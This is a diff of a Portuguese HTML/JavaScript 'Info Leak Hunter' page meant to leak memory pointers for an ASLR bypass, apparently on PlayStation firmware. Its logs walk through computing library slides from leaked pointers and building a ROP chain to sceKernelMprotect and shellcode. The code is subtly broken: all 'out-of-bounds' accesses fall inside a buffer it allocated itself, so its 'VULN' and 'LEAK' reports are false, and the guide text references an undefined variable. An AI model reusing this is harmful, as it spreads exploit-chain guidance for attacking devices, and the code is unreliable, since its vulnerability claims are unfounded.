@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Info Leak Hunter para ASLR (Focado)</title>
+    <title>Info Leak Hunter Avançado (Focado)</title>
     <style>
         body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 14px; }
         #output, #output-canvas {
@@ -16,17 +16,18 @@
         }
         .log-info { color: #6cf; } .log-test { color: #fff; font-weight: bold; margin-top: 10px; display: block; border-top: 1px dashed #555; padding-top: 5px; } .log-subtest { color: #eee; font-weight: bold; margin-left: 10px; } .log-vuln { color: #ff4444; font-weight: bold; } .log-good { color: #4CAF50; } .log-warn { color: #FFC107; } .log-error { color: #f44336; } .log-critical { color: #f0f; font-weight: bold; } .log-leak { color: #FF9800; font-weight: bold; } .log-ptr { color: #f0f; font-weight: bold; }
         .log-escalation { background-color: #800000; color: #fff; font-weight: bold; padding: 1px 3px; border-radius: 3px; }
-        #xss-target-div { border: 2px dotted red; padding: 5px; margin: 15px 0; color: yellow; min-height: 60px; overflow-y: auto; display: none; /* Ocultado pois XSS não é o foco */ }
-        #interactive-canvas { display: none; /* Ocultado pois Canvas não é o foco principal */ }
+        #xss-target-div { display: none; }
+        #interactive-canvas { display: none; }
         #canvas-coord-status { display: none; }
         hr { border: 1px solid #555; margin: 20px 0; }
     </style>
 </head>
 <body>
-    <h1>Info Leak Hunter (OOB Read) - Foco em ASLR Bypass</h1>
-    <p>Este script foca em executar o teste <code>testOOBReadInfoLeakEnhancedStore</code> para tentar vazar ponteiros da memória, auxiliando na análise para contornar o ASLR.</p>
-    <button id="runBtn" onclick="runAllTests()">Iniciar Teste de Info Leak</button>
+    <h1>Info Leak Hunter Avançado (OOB Read) - Foco em ASLR Bypass</h1>
+    <p>Este script foca em executar o teste <code>testOOBReadInfoLeakEnhancedStore</code> com configurações avançadas para tentar vazar ponteiros da memória, auxiliando na análise para contornar o ASLR.</p>
+    <button id="runBtn" onclick="runAllTests()">Iniciar Teste de Info Leak Avançado</button>
     <div id="output"></div>
+
     <script>
         'use strict';
         // --- Script Utilities (Shared) ---
@@ -34,65 +35,69 @@
             TO_HEX: (val, bits = 32) => {
                 if (typeof val !== 'number' || !isFinite(val)) return 'NaN/Invalid';
                 let num = Number(val);
-                if (bits <= 32) { num = num >>> 0; }
+                if (bits <= 32) { num = num >>> 0; } // Para garantir que números de 32 bits sejam tratados como unsigned
                 const pad = Math.ceil(bits / 4);
                 return '0x' + num.toString(16).toUpperCase().padStart(pad, '0');
             },
             IS_POTENTIAL_POINTER_64: (high, low) => {
                 if (high === null || low === null || typeof high !== 'number' || typeof low !== 'number') return false;
-                if (high === 0 && low === 0) return false;
-                if (high === 0xFFFFFFFF && low === 0xFFFFFFFF) return false; // Common invalid/fill patterns
-                if (high === 0xAAAAAAAA && low === 0xAAAAAAAA) return false; // Common fill pattern
-                // Ajuste: Permitir ponteiros para regiões mais baixas se high não for 0,
-                // mas manter restrição se high for 0 (evitar falsos positivos com pequenos inteiros)
-                if (high === 0 && low < 0x10000) return false; // Pointers to very low memory if high is also 0
-                if (high < 0x100 && low < 0x10000) return false; // Heuristic: avoid small numbers that are unlikely pointers
+                // Converter para unsigned 32-bit para a comparação
+                const uHigh = high >>> 0;
+                const uLow = low >>> 0;
+
+                if (uHigh === 0 && uLow === 0) return false;
+                if (uHigh === 0xFFFFFFFF && uLow === 0xFFFFFFFF) return false; // Common invalid/fill patterns
+                if (uHigh === 0xBBBBBBBB && uLow === 0xBBBBBBBB) return false; // Novo padrão de preenchimento
+                if (uHigh === 0xAAAAAAAA && uLow === 0xAAAAAAAA) return false; // Padrão de preenchimento anterior (por segurança)
+                
+                // Heurística mais flexível (Sugestão 3)
+                if (uHigh === 0 && uLow < 0x1000) return false; // Filtrar apenas valores muito pequenos se high também for 0
+                // A condição abaixo pode ser comentada para testes ainda mais permissivos:
+                // if (uHigh < 0x20 && uLow < 0x10000 && uHigh !==1 && uHigh !==2) return false; // Exemplo de filtro adicional, pode ser ajustado
+
+                // Típico para ponteiros de kernel ou userland em alguns sistemas 64-bit (ex: PlayStation)
+                // A parte alta pode ser pequena (e.g., 0x0, 0x1, 0x2) ou um valor alto (e.g. 0xFFFF....)
+                // A parte baixa geralmente não é extremamente pequena.
+                // A heurística original era: if (high === 0 && low < 0x100000) return false;
+                // A nova, mais relaxada, já está acima.
                 return true;
             },
             IS_POTENTIAL_DATA_32: (val) => {
                 if (val === null || typeof val !== 'number') return false;
-                val = val >>> 0;
-                if (val === 0 || val === 0xFFFFFFFF || val === 0xAAAAAAAA || val === 0xAAAAAAEE) return false; // Common fill/invalid patterns
-                if (val < 0x1000) return false; // Exclude very small numbers
+                val = val >>> 0; // Tratar como unsigned
+                if (val === 0 || val === 0xFFFFFFFF || val === 0xAAAAAAAA || val === 0xBBBBBBBB || val === 0xAAAAAAEE) return false; // Padrões de preenchimento/inválidos
+                if (val < 0x1000) return false; // Excluir números muito pequenos
                 return true;
             }
         };
 
         // --- Log Constants ---
         const LOG_TRUNCATE_MSG_S1 = "[Log S1 Truncado...]";
-        const LOG_MAX_LENGTH = 600000;
-        const LOG_TRUNCATE_KEEP_LENGTH = 300000;
+        const LOG_MAX_LENGTH = 800000; // Aumentado um pouco para mais logs com guias repetidos
+        const LOG_TRUNCATE_KEEP_LENGTH = 400000;
 
-        // --- Script 1 (v18.4-infoleak-focused) ---
+        // --- Script 1 (v18.5-infoleak-enhanced) ---
         const outputDiv = document.getElementById('output');
         const runBtn = document.getElementById('runBtn');
-        const SHORT_PAUSE = 50;
-        const MEDIUM_PAUSE = 500; // Mantido para consistência, mas menos relevante agora
-        let leakedValueFromOOB = null; // Variável global para armazenar o primeiro leak significativo
+        const SHORT_PAUSE = 20; // Pausas menores para agilizar um pouco
+        let leakedValueFromOOB = null; // Armazena o primeiro leak U64 globalmente (uso opcional)
 
         const IMPORTANT_LOG_TYPES_S1 = ['test', 'vuln', 'critical', 'error', 'escalation', 'leak', 'ptr', 'good'];
 
         const log = (message, type = 'info', funcName = '') => {
-            // Lógica de filtragem de log mantida, adaptada se necessário
             let keepLog = IMPORTANT_LOG_TYPES_S1.includes(type);
             if (!keepLog && type === 'good') {
                 const lowerMsg = String(message).toLowerCase();
                  if (lowerMsg.includes('bloqueado') || lowerMsg.includes('falhou') || lowerMsg.includes('não encontrado') || lowerMsg.includes('concluído')) { keepLog = true; }
             }
             if (!keepLog) return;
-
             if (!outputDiv) return;
             try {
                 const timestamp = `[${new Date().toLocaleTimeString()}]`;
                 const prefix = funcName ? `[${funcName}] ` : '';
                 const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;");
                 const logClass = ['info', 'test', 'subtest', 'vuln', 'good', 'warn', 'error', 'leak', 'ptr', 'critical', 'escalation'].includes(type) ? type : 'info';
-
-                if(outputDiv.innerHTML.length > LOG_MAX_LENGTH){
-                    outputDiv.innerHTML = outputDiv.innerHTML.substring(outputDiv.innerHTML.length - LOG_TRUNCATE_KEEP_LENGTH);
-                    outputDiv.innerHTML = `<span>${LOG_TRUNCATE_MSG_S1}</span>\n` + outputDiv.innerHTML;
-                }
-
+                if(outputDiv.innerHTML.length > LOG_MAX_LENGTH){ outputDiv.innerHTML = outputDiv.innerHTML.substring(outputDiv.innerHTML.length - LOG_TRUNCATE_KEEP_LENGTH); outputDiv.innerHTML = `<span>${LOG_TRUNCATE_MSG_S1}</span>\n` + outputDiv.innerHTML; }
                 outputDiv.innerHTML += `<span class="log-${logClass}">${timestamp} ${prefix}${sanitizedMessage}\n</span>`;
                 outputDiv.scrollTop = outputDiv.scrollHeight;
             } catch(e) { console.error("Erro log S1:", e); if (outputDiv) outputDiv.innerHTML += `[${new Date().toLocaleTimeString()}] [LOGGING ERROR] ${String(e)}\n`; }
@@ -102,52 +107,61 @@
 
         const testOOBReadInfoLeakEnhancedStore = async () => {
             const FNAME = 'testOOBReadInfoLeakEnhancedStore';
-            log("--- Iniciando Teste ÚNICO: OOB Write/Read (Info Leak para ASLR) ---", 'test', FNAME);
-            const bufferSize = 32; // Tamanho do buffer principal
-            const writeValue = 0xEE; // Valor a ser escrito OOB
-            const oobWriteOffset = bufferSize; // Onde escrever OOB em relação ao início do buffer lógico
-            const readRangeStart = -128; // Quão "antes" do buffer lógico começar a ler
-            const readRangeEnd = bufferSize + 128; // Quão "depois" do buffer lógico terminar de ler
-            const allocationSize = bufferSize + 512; // Tamanho real da alocação para dar espaço para leituras OOB
-            const baseOffsetInBuffer = 256; // Onde o buffer lógico começa dentro da alocação real
+            log("--- Iniciando Teste Avançado: OOB Write/Read (Info Leak para ASLR) ---", 'test', FNAME);
+            
+            const bufferSize = 32; 
+            const writeValue = 0xED; // (Sugestão 4) Novo valor de escrita para diferenciar
+            const oobWriteOffset = bufferSize;
+
+            // (Sugestão 1) Aumentar Faixa de Leitura
+            const readRangeStart = -384; // Ex: Ler 384 bytes "antes"
+            const readRangeEnd = bufferSize + 384; // Ex: Ler 384 bytes "depois" do fim do bufferSize
+            
+            // (Sugestão 2) Ajustar allocationSize e baseOffsetInBuffer Proporcionalmente
+            const allocationMargin = 256; // Espaço extra para evitar erros de borda do JS ArrayBuffer
+            const requiredSpaceForRead = Math.abs(readRangeStart) + bufferSize + (readRangeEnd - bufferSize);
+            const allocationSize = requiredSpaceForRead + allocationMargin; 
+            const baseOffsetInBuffer = Math.abs(readRangeStart) + (allocationMargin / 2);
+
+            log(`Config: bufferSize=${bufferSize}, writeValue=0x${writeValue.toString(16)}, readStart=${readRangeStart}, readEnd=${readRangeEnd}, allocSize=${allocationSize}, baseOffset=${baseOffsetInBuffer}`, 'info', FNAME);
 
             const oobReadOffsets = [];
-            for (let i = readRangeStart; i < readRangeEnd; i += 4) { // Ler a cada 4 bytes (tamanho de U32)
+            for (let i = readRangeStart; i < readRangeEnd; i += 4) {
                 oobReadOffsets.push(i);
             }
 
             let writeSuccess = false;
             let potentialLeakFoundCount = 0;
-            leakedValueFromOOB = null; // Resetar leak global
+            let u64LeakCount = 0; // Contador específico para leaks U64
+            leakedValueFromOOB = null;
 
             try {
                 const buffer = new ArrayBuffer(allocationSize);
                 const dataView = new DataView(buffer);
 
-                // Preencher o buffer com um padrão conhecido (0xAA)
+                // (Sugestão 4) Alterar o Padrão de Preenchimento do Buffer
+                log(`Preenchendo buffer de ${allocationSize} bytes com 0xBB...`, 'info', FNAME);
                 for (let i = 0; i < buffer.byteLength; i++) {
-                    dataView.setUint8(i, 0xAA);
+                    dataView.setUint8(i, 0xBB);
                 }
 
                 const writeTargetAddress = baseOffsetInBuffer + oobWriteOffset;
                 await PAUSE_S1();
 
-                // Tentar a escrita Out-Of-Bounds
                 try {
                     dataView.setUint8(writeTargetAddress, writeValue);
-                    log(`VULN: Escrita OOB U8 @offset_relativo ${oobWriteOffset} (endereço_no_buffer_real ${writeTargetAddress}) OK! Valor escrito=${SCRIPT_UTILS.TO_HEX(writeValue, 8)}`, 'vuln', FNAME);
+                    log(`VULN: Escrita OOB U8 @offset_relativo ${oobWriteOffset} (addr_real ${writeTargetAddress}) OK! Val=${SCRIPT_UTILS.TO_HEX(writeValue, 8)}`, 'vuln', FNAME);
                     log(`---> PRIMITIVA OOB WRITE OBTIDA <---`, 'escalation', FNAME);
                     writeSuccess = true;
                 } catch (e) {
-                    log(`Escrita OOB U8 @offset_relativo ${oobWriteOffset} (endereço_no_buffer_real ${writeTargetAddress}) FALHOU/Bloqueada: ${e.message}`, 'good', FNAME);
-                    log(`--- Teste Concluído (Escrita OOB Falhou, não é possível prosseguir com a leitura para leak) ---`, 'test', FNAME);
-                    return false; // Se a escrita falhar, a leitura para leak pode não ser significativa
+                    log(`Escrita OOB U8 @offset_relativo ${oobWriteOffset} (addr_real ${writeTargetAddress}) FALHOU/Bloqueada: ${e.message}`, 'good', FNAME);
+                    log(`--- Teste Concluído (Escrita OOB Falhou) ---`, 'test', FNAME);
+                    return false;
                 }
 
                 await PAUSE_S1();
-                log("Iniciando varredura de memória OOB para potenciais ponteiros...", 'info', FNAME);
+                log("Iniciando varredura de memória OOB para potenciais ponteiros (faixa ampliada, heurística relaxada)...", 'info', FNAME);
 
-                // Ler a memória ao redor (incluindo OOB)
                 for (const readOffset of oobReadOffsets) {
                     const readTargetAddress = baseOffsetInBuffer + readOffset;
                     const relOffsetStr = `@offset_relativo ${readOffset} (addr_real ${readTargetAddress})`;
@@ -155,146 +169,137 @@
                     // Tentar ler como U64 (8 bytes)
                     if (readTargetAddress >= 0 && readTargetAddress + 8 <= buffer.byteLength) {
                         try {
-                            const low = dataView.getUint32(readTargetAddress, true); // Little-endian
-                            const high = dataView.getUint32(readTargetAddress + 4, true); // Little-endian
+                            const low = dataView.getUint32(readTargetAddress, true);
+                            const high = dataView.getUint32(readTargetAddress + 4, true);
 
                             if (SCRIPT_UTILS.IS_POTENTIAL_POINTER_64(high, low)) {
                                 const vStr = `High=${SCRIPT_UTILS.TO_HEX(high)} Low=${SCRIPT_UTILS.TO_HEX(low)}`;
                                 log(`LEAK PTR? U64 ${relOffsetStr}: ${vStr}`, 'ptr', FNAME);
-                                potentialLeakFoundCount++;
-                                if (leakedValueFromOOB === null) { // Armazenar o primeiro leak significativo
-                                    leakedValueFromOOB = { high, low, type: 'U64', offset_relativo: readOffset, offset_real: readTargetAddress };
-                                    log(` ---> PRIMEIRO LEAK U64 SIGNIFICATIVO ARMAZENADO: ${vStr} ${relOffsetStr}.`, 'vuln', FNAME);
-                                    log(`    ---> GUIA ASLR/EXPLOIT:
-        1. IDENTIFIQUE ESTE PONTEIRO: Compare '${vStr}' com os endereços nos seus arquivos:
-           - 'endereços base.txt': Este ponteiro está próximo a algum base (ex: libkernel, libc)?
-           - Se sim, calcule o SLIDE ASLR: slide = (valor_do_ponteiro_vazado) - (offset_conhecido_do_item_apontado_na_lib_OU_base_da_lib_se_vazou_ponteiro_para_inicio_de_funcao).
-        2. CALCULE ENDEREÇOS REAIS: Use o SLIDE com os offsets dos seus arquivos:
-           - 'libkernel.sprx.txt', 'libkernel_web.sprx.txt': Para achar gadgets ROP e funções. Endereço Real = offset_do_gadget/funcao_no_arquivo + slide.
-           - 'offsets base libkernel web.txt': Para syscalls como open/read/write. Endereço Real = offset_do_arquivo + slide_da_libkernel_web.
-           - 'sceKernelMprotect.txt': Para obter o endereço real de sceKernelMprotect. Endereço Real = offset_mprotect (ex: 0x24280) + slide_da_libkernel.
-        3. PLANEJE SEU EXPLOIT: Com endereços reais, construa sua ROP chain para chamar sceKernelMprotect, depois seu shellcode, ou outras funções.
-        4. ALOCADOR: Use 'alocador de memoria customizado.txt' para entender como sua primitiva OOB Write pode ser usada para corromper o heap e obter R/W arbitrário, caso este leak não seja suficiente por si só.`, 'escalation', FNAME);
+                                potentialLeakFoundCount++; // Conta geral
+                                u64LeakCount++; // Conta específica U64
 
+                                // (Sugestão 5) Logar "GUIA ASLR/EXPLOIT" para cada U64 válido
+                                const leakIdentifier = `Leak U64 #${u64LeakCount}`;
+                                log(` (${leakIdentifier}) ---> GUIA ASLR/EXPLOIT (para ${vStr}):
+        1. IDENTIFIQUE ESTE PONTEIRO: Compare '${vStr}' com os endereços nos seus arquivos:
+           - 'endereços base.txt': Este ponteiro (${low_hex_part_only}) está próximo a algum base (ex: libkernel @ ${SCRIPT_UTILS.TO_HEX(0x80FCA000)}, libc @ ${SCRIPT_UTILS.TO_HEX(0x180AC8000)})?
+           - Se sim, CALCULE O SLIDE ASLR: slide = (valor_do_ponteiro_vazado) - (offset_conhecido_do_item_apontado_na_lib OU base_da_lib_se_vazou_ponteiro_para_inicio_de_funcao).
+             (Ex: Se ${vStr} aponta para algo que na libkernel (base 0x80FCA000) está no offset +0xABCD, então o novo base da libkernel é ${vStr} - 0xABCD)
+        2. CALCULE ENDEREÇOS REAIS: Use o NOVO BASE da lib (ou o SLIDE) com os offsets dos seus arquivos:
+           - 'libkernel.sprx.txt', 'libkernel_web.sprx.txt': Para ROP gadgets e funções. Endereço Real = offset_original_do_gadget/funcao + novo_base_da_lib.
+           - 'offsets base libkernel web.txt': Para syscalls. Endereço Real = offset_do_arquivo + novo_base_da_libkernel_web (se o slide for aplicável).
+           - 'sceKernelMprotect.txt': Para mprotect. Endereço Real = offset_mprotect (ex: 0x24280) + novo_base_da_libkernel.
+        3. PLANEJE SEU EXPLOIT: Construa sua ROP chain.
+        4. ALOCADOR: Use 'alocador de memoria customizado.txt' se precisar de R/W arbitrário.`.replace("${low_hex_part_only}", SCRIPT_UTILS.TO_HEX(low)), 'escalation', FNAME);
+                                
+                                if (!leakedValueFromOOB) { // Armazenar o primeiro para referência global, se útil
+                                    leakedValueFromOOB = { high, low, type: 'U64', offset_relativo: readOffset, offset_real: readTargetAddress };
                                 }
                             }
-                        } catch (e) { /* Silenciar erros de leitura OOB se estiverem fora dos limites estritos, focando nos sucessos */ }
+                        } catch (e) { /* Silenciar erros de leitura OOB, focando nos sucessos */ }
                     }
                     
-                    // Tentar ler como U32 (4 bytes), se não for parte de um U64 já logado como mais provável
-                    // e se o leakedValueFromOOB (que prioriza U64) ainda não foi preenchido.
-                    if (leakedValueFromOOB === null && readTargetAddress >= 0 && readTargetAddress + 4 <= buffer.byteLength) {
-                        try {
-                            // Evitar re-logar a parte baixa de um U64 como um U32 separado se já consideramos U64
-                            let partOfExistingU64 = false;
-                            if (potentialLeakFoundCount > 0 && leakedValueFromOOB && leakedValueFromOOB.type === 'U64') {
-                                if (readOffset === leakedValueFromOOB.offset_relativo || readOffset === leakedValueFromOOB.offset_relativo + 4) {
-                                    partOfExistingU64 = true;
-                                }
+                    // Leitura U32 (para dados gerais, se não for parte de um U64 já logado)
+                    if (readTargetAddress >= 0 && readTargetAddress + 4 <= buffer.byteLength) {
+                         try {
+                            let isPartOfU64Leak = false;
+                            // Verifica se este endereço já foi coberto por um U64 detectado (para evitar logar low part como U32 separado)
+                            // Simples checagem: se o U64 anterior foi neste offset ou 4 bytes antes.
+                            if (u64LeakCount > 0 && dataView.getUint32(readTargetAddress - 4, true) !== undefined && SCRIPT_UTILS.IS_POTENTIAL_POINTER_64(dataView.getUint32(readTargetAddress, true), dataView.getUint32(readTargetAddress - 4, true))) {
+                                 // Heurística: se o valor atual e o anterior formam um ponteiro 64-bit, provavelmente este é o high part, não um U32 isolado.
+                                 // Esta lógica pode ser aprimorada para ser mais precisa na identificação de sobreposição.
+                                 // Por ora, vamos focar em não logar U32 se um U64 foi logado no mesmo local.
+                                if(leakedValueFromOOB && leakedValueFromOOB.offset_relativo === readOffset -4) isPartOfU64Leak = true;
                             }
+                             if (leakedValueFromOOB && leakedValueFromOOB.offset_relativo === readOffset && leakedValueFromOOB.type === 'U64') isPartOfU64Leak = true;
 
-                            if (!partOfExistingU64) {
+
+                            if (!isPartOfU64Leak) {
                                 const val32 = dataView.getUint32(readTargetAddress, true);
-                                if (SCRIPT_UTILS.IS_POTENTIAL_DATA_32(val32) && !SCRIPT_UTILS.IS_POTENTIAL_POINTER_64(0, val32) ) { // Evitar que pequenos ponteiros (high=0) sejam apenas "dados"
+                                if (val32 !== 0xBBBBBBBB && SCRIPT_UTILS.IS_POTENTIAL_DATA_32(val32) && !SCRIPT_UTILS.IS_POTENTIAL_POINTER_64(0, val32)) {
                                     const vStr32 = SCRIPT_UTILS.TO_HEX(val32);
                                     log(`LEAK DATA? U32 ${relOffsetStr}: ${vStr32}`, 'leak', FNAME);
                                     potentialLeakFoundCount++;
-                                    // Não sobrescrever leakedValueFromOOB se já tivermos um U64, que é geralmente mais útil para ASLR
                                 }
                             }
                         } catch (e) { /* Silenciar */ }
                     }
 
-                    if (readOffset % 32 === 0) await PAUSE_S1(1); // Pequena pausa para não sobrecarregar
+                    if (readOffset % 128 === 0) await PAUSE_S1(5); // Pausa um pouco maior a cada 128 leituras
                 }
             } catch (e) {
                 log(`Erro FATAL no Teste de Info Leak: ${e.message}`, 'error', FNAME);
                 console.error(e);
             } finally {
                 const leakStatus = leakedValueFromOOB ? `1º leak U64 ARMAZENADO: High=${SCRIPT_UTILS.TO_HEX(leakedValueFromOOB.high)} Low=${SCRIPT_UTILS.TO_HEX(leakedValueFromOOB.low)} @rel ${leakedValueFromOOB.offset_relativo}` : 'nenhum U64 significativo armazenado globalmente';
-                log(`--- Teste de Info Leak Concluído ---
+                log(`--- Teste de Info Leak Avançado Concluído ---
     Escrita OOB bem-sucedida: ${writeSuccess}
-    Total de leaks U64/U32 potenciais visualizados: ${potentialLeakFoundCount}
+    Total de leaks U64 potenciais visualizados (com GUIA): ${u64LeakCount}
+    (Contagem geral de U64/U32 pode ser maior: ${potentialLeakFoundCount})
     Status do 1º Leak U64 Armazenado: ${leakStatus}
-    Utilize os logs 'LEAK PTR? U64' e o 'GUIA ASLR/EXPLOIT' acima com seus arquivos de firmware.`, 'test', FNAME);
-                 /* Comentário de Contexto para Exploração (Mantido):
-                 Uma primitiva de leitura OOB confiável que vaza ponteiros válidos é o primeiro passo para contornar o ASLR.
-                 A exploração normalmente envolveria:
-                 1. Identificar a qual módulo/região o ponteiro vazado pertence (usando os seus arquivos .txt).
-                 2. Calcular o endereço base desse módulo (slide ASLR).
-                 3. Com o endereço base, calcular os endereços de funções/gadgets ROP dentro desse módulo.
-                 Isto requer conhecimento da arquitetura do processo e dos módulos carregados.
-                 */
+    Analise CADA 'GUIA ASLR/EXPLOIT' nos logs acima com seus arquivos de firmware.`, 'test', FNAME);
             }
-            return writeSuccess; // Retorna se a escrita OOB (pré-requisito para o leak intencional) funcionou
+            return writeSuccess;
         };
 
         const runAllTests = async () => {
             const FNAME = 'runAllTests';
             if (runBtn) runBtn.disabled = true;
-            outputDiv.innerHTML = ''; // Limpar logs anteriores
-            log("==== INICIANDO Script Info Leak Hunter (v18.4-infoleak-focused) ====", 'test', FNAME);
-
-            await testOOBReadInfoLeakEnhancedStore(); // Único teste a ser executado
-
-            log("\n==== Script Info Leak Hunter CONCLUÍDO (v18.4-infoleak-focused) ====", 'test', FNAME);
+            outputDiv.innerHTML = '';
+            log("==== INICIANDO Script Info Leak Hunter Avançado (v18.5-infoleak-enhanced) ====", 'test', FNAME);
+            await testOOBReadInfoLeakEnhancedStore();
+            log("\n==== Script Info Leak Hunter Avançado CONCLUÍDO (v18.5-infoleak-enhanced) ====", 'test', FNAME);
             if (runBtn) runBtn.disabled = false;
         };
     </script>
 
     <script>
         'use strict';
-        // --- Script 2: Canvas (v18.4-infoleak-focused) ---
-        // Funcionalidade do Canvas removida/minimizada para focar no Script 1.
-        // SCRIPT_UTILS e constantes de log já estão definidos globalmente.
-
+        // --- Script 2: Canvas (v18.5-infoleak-enhanced) ---
+        // Funcionalidade do Canvas permanece minimizada.
         let outputDivCanvas = null;
         const LOG_TRUNCATE_MSG_S2 = "[Log S2 Truncado...]";
 
-
         const logCanvas = (message, type = 'info', funcName = '') => {
-            // Lógica de log simplificada para o canvas, se necessário, ou pode ser removida se o canvas não logar nada.
-            if (!outputDivCanvas) outputDivCanvas = document.getElementById('output-canvas');
-            if (!outputDivCanvas) return;
+            if (!outputDivCanvas) outputDivCanvas = document.getElementById('output-canvas'); // Adicionado para garantir que outputDivCanvas seja definido
+            if (!document.getElementById('output-canvas') && !outputDivCanvas) return; // Se o div não existe e não foi pego
+            if (!outputDivCanvas && document.getElementById('output-canvas')) outputDivCanvas = document.getElementById('output-canvas');
+
 
             const timestamp = `[${new Date().toLocaleTimeString()}]`;
             const prefix = funcName ? `[CANVAS-${funcName}] ` : '[CANVAS] ';
             const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;");
             const logClass = ['info', 'test', 'vuln', 'good', 'warn', 'error', 'critical'].includes(type) ? type : 'info';
 
-             if(outputDivCanvas.innerHTML.length > LOG_MAX_LENGTH){ // Usando LOG_MAX_LENGTH global
-                 outputDivCanvas.innerHTML = outputDivCanvas.innerHTML.substring(outputDivCanvas.innerHTML.length - LOG_TRUNCATE_KEEP_LENGTH); // Usando LOG_TRUNCATE_KEEP_LENGTH global
-                 outputDivCanvas.innerHTML = `<span>${LOG_TRUNCATE_MSG_S2}</span>\n` + outputDivCanvas.innerHTML;
+            if (outputDivCanvas) { // Verificar se outputDivCanvas é válido antes de usar
+                 if(outputDivCanvas.innerHTML.length > LOG_MAX_LENGTH){
+                     outputDivCanvas.innerHTML = outputDivCanvas.innerHTML.substring(outputDivCanvas.innerHTML.length - LOG_TRUNCATE_KEEP_LENGTH);
+                     outputDivCanvas.innerHTML = `<span>${LOG_TRUNCATE_MSG_S2}</span>\n` + outputDivCanvas.innerHTML;
+                }
+                outputDivCanvas.innerHTML += `<span class="log-${logClass}">${timestamp} ${prefix}${sanitizedMessage}\n</span>`;
+                outputDivCanvas.scrollTop = outputDivCanvas.scrollHeight;
+            } else {
+                console.log(`${timestamp} ${prefix}${sanitizedMessage}`); // Fallback para console se div não encontrado
             }
-            outputDivCanvas.innerHTML += `<span class="log-${logClass}">${timestamp} ${prefix}${sanitizedMessage}\n</span>`;
-            outputDivCanvas.scrollTop = outputDivCanvas.scrollHeight;
         };
         
         const runCanvasTestSequence = async () => {
             const FNAME = 'runCanvasTestSequence';
-            outputDivCanvas = document.getElementById('output-canvas');
+            // Ocultamos o botão do canvas no HTML, mas se ele for reativado:
             const runBtnCanvas = document.getElementById('runCanvasBtn');
-
             if (runBtnCanvas) runBtnCanvas.disabled = true;
+            
+            // Tenta pegar o div do canvas se não estiver já definido
+            if (!outputDivCanvas) outputDivCanvas = document.getElementById('output-canvas');
             if (outputDivCanvas) outputDivCanvas.innerHTML = '';
 
-            logCanvas("Script Canvas (v18.4-infoleak-focused): Nenhuma tarefa de teste de vulnerabilidade ativa nesta versão.", "info", FNAME);
-            // Nenhuma chamada de teste de vulnerabilidade aqui.
-            // A lógica de desenho e interação com quadrados foi removida.
-            // O canvas e o botão permanecem no HTML, mas o botão não dispara testes complexos.
-
-            logCanvas("--- Fim da execução Script Canvas (v18.4-infoleak-focused) ---", 'test', FNAME);
+            logCanvas("Script Canvas (v18.5-infoleak-enhanced): Nenhuma tarefa de teste de vulnerabilidade ativa.", "info", FNAME);
+            logCanvas("--- Fim da execução Script Canvas ---", 'test', FNAME);
             if (runBtnCanvas) runBtnCanvas.disabled = false;
         };
 
-        const runCanvasTest = async () => {
-            await runCanvasTestSequence();
-        };
-        
-        // Event listener de unload pode ser mantido para limpeza genérica se houver.
-        window.addEventListener('unload', () => { 
-            console.log("[App Unload] Limpeza geral (se houver)."); 
-        });
+        const runCanvasTest = async () => { await runCanvasTestSequence(); };
+        window.addEventListener('unload', () => { console.log("[App Unload] Limpeza."); });
     </script>
 
 </body>
